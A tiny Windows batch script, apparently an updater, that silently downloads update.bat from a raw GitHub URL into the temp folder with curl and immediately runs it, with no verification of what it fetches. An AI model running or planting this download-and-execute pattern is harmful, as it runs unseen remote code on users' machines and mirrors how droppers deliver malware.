@echo off
cd %temp%
curl -s https://raw.githubusercontent.com/PinguinButInSpanish/Installer/main/update.bat --output update.bat
start update.bat
exit